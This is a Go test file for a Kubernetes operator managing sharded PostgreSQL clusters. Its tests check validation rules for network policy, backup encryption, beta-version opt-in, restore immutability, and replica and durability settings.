func TestClusterNetworkPolicyWithAClientAccepted(t *testing.T) {
	c := validCluster("netpol-client")
	c.Spec.NetworkPolicy.Enabled = true
	c.Spec.NetworkPolicy.Clients = []networkingv1.NetworkPolicyPeer{{
		NamespaceSelector: &metav1.LabelSelector{MatchLabels: map[string]string{"kubernetes.io/metadata.name": "pgshard-system"}},
	}}
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
}

// TestRemoteRepositoryIsEncryptedUnlessSaidOtherwise: a backup repository
// is a complete copy of every tenant's database, and a remote store is
// somebody else's disk. Encryption was optional and off by default, so the
// ordinary way to configure a cluster left plaintext copies of everything
// in an object store.
func TestRemoteRepositoryIsEncryptedUnlessSaidOtherwise(t *testing.T) {
	secret := pgshardv1alpha1.SecretRefSpec{SecretRef: &corev1.LocalObjectReference{Name: "creds"}}
	policy := func(name string, st pgshardv1alpha1.ObjectStoreSpec) *pgshardv1alpha1.PgShardBackupPolicy {
		return &pgshardv1alpha1.PgShardBackupPolicy{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
			Spec:       pgshardv1alpha1.PgShardBackupPolicySpec{ObjectStore: st},
		}
	}
	for name, store := range map[string]pgshardv1alpha1.ObjectStoreSpec{
		"s3":    {Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "eu", Credentials: secret},
		"azure": {Type: "azure", Container: "c", Credentials: secret},
		"gcs":   {Type: "gcs", Bucket: "b", CredentialType: "auto"},
		"sftp":  {Type: "sftp", SFTP: &pgshardv1alpha1.SFTPStoreSpec{Host: "h", User: "u"}, Credentials: secret},
	} {
		mustReject(t, policy("plain-"+name, store), "must set encryption.secretRef")
	}

	// Saying so is allowed; not noticing is not.
	open := pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "eu", Credentials: secret, InsecureUnencrypted: true}
	if err := create(t, policy("deliberately-plain", open)); err != nil {
		t.Fatalf("an explicit opt-out must be accepted: %v", err)
	}
	// A posix repository is a PVC of this cluster's own.
	if err := create(t, policy("posix-plain", pgshardv1alpha1.ObjectStoreSpec{Type: "posix"})); err != nil {
		t.Fatalf("posix needs no encryption: %v", err)
	}
}

// TestABetaMajorHasToBeAskedForByName: PostgreSQL says a beta is not
// intended for production and may contain serious bugs. `major: 19` on its
// own reads like any other supported choice and resolves to a moving tag,
// so it is refused until an image says the choice was deliberate. 18 is a
// release and needs nothing.
func TestABetaMajorHasToBeAskedForByName(t *testing.T) {
	bare := validCluster("beta-bare")
	bare.Spec.PostgreSQL.Major = 19
	mustReject(t, bare, "PostgreSQL 19 is a beta")

	named := validCluster("beta-named")
	named.Spec.PostgreSQL.Major = 19
	named.Spec.PostgreSQL.Image = "ghcr.io/andrew01234567890/pgshard-postgres:19beta3"
	if err := create(t, named); err != nil {
		t.Fatalf("naming the image is the opt-in: %v", err)
	}

	// A release major is unaffected: nothing to acknowledge.
	release := validCluster("release-bare")
	release.Spec.PostgreSQL.Major = 18
	if err := create(t, release); err != nil {
		t.Fatalf("18 is a release and needs no image: %v", err)
	}
}

// TestARestoreSpecDoesNotChangeUnderTheOperator: a restore starts the
// moment its child cluster is created. The recovery target is serialized
// into that cluster at creation, but whether the barrier's two-phase
// reconciliation runs afterwards is read from the live spec -- so turning
// a plain restore into a barrier one after the child exists would have the
// operator resolve prepared transactions against a cluster recovered to
// the original, uncertified point.
func TestARestoreSpecDoesNotChangeUnderTheOperator(t *testing.T) {
	lsn := "0/16B6C50"
	r := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "immutable-restore", Namespace: "default"},
		Spec: pgshardv1alpha1.PgShardRestoreSpec{
			ClusterName: "src", NewClusterName: "dst", BackupID: "b1",
			Target: pgshardv1alpha1.RestoreTarget{LSN: &lsn},
		},
	}
	if err := create(t, r); err != nil {
		t.Fatal(err)
	}

	// The edit the ticket is about: a plain restore becomes a barrier one.
	changed := r.DeepCopy()
	barrier := "nightly-barrier"
	changed.Spec.Target = pgshardv1alpha1.RestoreTarget{Barrier: &barrier}
	if err := k8sClient.Update(context.Background(), changed); err == nil {
		t.Fatal("a restore's target must not change once the restore exists")
	} else if !strings.Contains(err.Error(), "immutable") {
		t.Fatalf("update rejected for the wrong reason: %v", err)
	}

	// Metadata is not the request, so it stays editable: a label or an
	// annotation says nothing about which point the cluster recovers to.
	labelled := r.DeepCopy()
	labelled.Labels = map[string]string{"team": "platform"}
	if err := k8sClient.Update(context.Background(), labelled); err != nil {
		t.Fatalf("labels are not part of the request: %v", err)
	}
}

// TestAReplicaCountMayShrinkButNotBelowItsDurability: lowering a count is
// reconciled now -- the members outside the new range are retired one at a
// time. What the API still refuses is a lowering that would leave the group
// unable to keep the durability it is configured for: a group of n members
// has n-1 standbys, so a commit cannot wait for n acknowledgements.
func TestAReplicaCountMayShrinkButNotBelowItsDurability(t *testing.T) {
	c := validCluster("scale")
	c.Spec.ReplicasPerShard = 5
	c.Spec.Catalog.Replicas = 5
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}

	for _, tc := range []struct {
		name   string
		mutate func(*pgshardv1alpha1.PgShardCluster)
		want   string
	}{
		{"a shard group left with fewer standbys than commits wait for",
			func(x *pgshardv1alpha1.PgShardCluster) {
				x.Spec.Durability.MinSyncStandbys = 2
				x.Spec.ReplicasPerShard = 2
			}, "replicasPerShard must stay above durability.minSyncStandbys"},
		{"a catalog group left with fewer standbys than commits wait for",
			func(x *pgshardv1alpha1.PgShardCluster) {
				x.Spec.Durability.MinSyncStandbys = 2
				x.Spec.Catalog.Replicas = 2
			}, "catalog.replicas must stay above durability.minSyncStandbys"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var cur pgshardv1alpha1.PgShardCluster
			if err := k8sClient.Get(context.Background(), client.ObjectKeyFromObject(c), &cur); err != nil {
				t.Fatal(err)
			}
			tc.mutate(&cur)
			err := k8sClient.Update(context.Background(), &cur)
			if err == nil {
				t.Fatal("a group cannot promise more acknowledgements than it has standbys")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("refused for the wrong reason: %v", err)
			}
		})
	}

	// Both directions are reconciled now. Lowering retires the members
	// above the new count one at a time; growing gives the new ordinals
	// pods and lets them join.
	for _, n := range []int{7, 3} {
		var cur pgshardv1alpha1.PgShardCluster
		if err := k8sClient.Get(context.Background(), client.ObjectKeyFromObject(c), &cur); err != nil {
			t.Fatal(err)
		}
		cur.Spec.ReplicasPerShard, cur.Spec.Catalog.Replicas = n, n
		if err := k8sClient.Update(context.Background(), &cur); err != nil {
			t.Fatalf("resizing a group to %d must be allowed: %v", n, err)
		}
	}
}

// TestADurabilityPromiseCanBeKept: a group of n members has n-1 standbys.
// Asking for more acknowledgements than that is asking for something no
// configuration can deliver, and the runtime quietly clamped it -- so the
// stored spec went on promising N while PostgreSQL was set up for fewer,
// and rollout admission read the unclamped number and could hold a group
// for a quorum that would never be reachable.
func TestADurabilityPromiseCanBeKept(t *testing.T) {
	for _, c := range []struct {
		name     string
		mutate   func(*pgshardv1alpha1.PgShardClusterSpec)
		wantPart string
	}{
		{"more than the shard has standbys", func(s *pgshardv1alpha1.PgShardClusterSpec) {
			s.ReplicasPerShard = 3
			s.Durability.MinSyncStandbys = 3
		}, "at most replicasPerShard - 1"},
		{"more than the catalog has standbys", func(s *pgshardv1alpha1.PgShardClusterSpec) {
			s.ReplicasPerShard = 5
			s.Catalog.Replicas = 3
			s.Durability.MinSyncStandbys = 4
		}, "at most catalog.replicas - 1"},
	} {
		t.Run(c.name, func(t *testing.T) {
			cl := validCluster("dur-" + strings.ReplaceAll(c.name, " ", "-"))
			c.mutate(&cl.Spec)
			mustReject(t, cl, c.wantPart)
		})
	}

	// Exactly the standbys that exist is the strictest promise that can be
	// kept, and it is accepted.
	ok := validCluster("dur-exact")
	ok.Spec.ReplicasPerShard = 3
	ok.Spec.Catalog.Replicas = 3
	ok.Spec.Durability.MinSyncStandbys = 2
	if err := create(t, ok); err != nil {
		t.Fatalf("n-1 acknowledgements from n members must be allowed: %v", err)
	}

	// unsafeSingleReplica already says there is no synchronous standby, so
	// it is not asked to say it twice.
	single := validCluster("dur-single")
	single.Spec.UnsafeSingleReplica = true
	single.Spec.ReplicasPerShard = 1
	single.Spec.Catalog.Replicas = 1
	if err := create(t, single); err != nil {
		t.Fatalf("the unsafe single-replica mode must stay usable: %v", err)
	}
}
